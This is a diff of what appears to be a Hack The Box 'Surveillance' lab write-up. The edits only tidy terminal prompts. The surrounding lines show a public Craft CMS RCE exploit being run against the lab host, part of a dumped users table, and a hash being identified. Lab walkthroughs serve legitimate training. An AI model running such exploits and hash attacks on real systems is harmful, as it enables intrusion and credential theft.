@@ -68,8 +68,8 @@ wp-admin                [Status: 418, Size: 21327, Words: 348, Lines: 64]
 [Craft CMS 4.4.14 - Unauthenticated Remote Code Execution ](https://www.exploit-db.com/exploits/51918)
 
 ```bash
-┌─[hector@hector-laptop] - [~/Downloads]
-└─[$] python3 51918.py http://surveillance.htb/                                                                                                                             [21:25:55]
+python3 51918.py http://surveillance.htb/
+
 [+] Executing phpinfo to extract some config infos
 temporary directory: /tmp
 web server root: /var/www/html/craft/web
@@ -113,7 +113,7 @@ INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','
 ```
 
 ```bash
-hashid -m hash.txt                                                                                                                                                    [22:04:59]
+hashid -m hash.txt
 --File 'hash.txt'--
 Analyzing '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec'
 [+] Snefru-256 
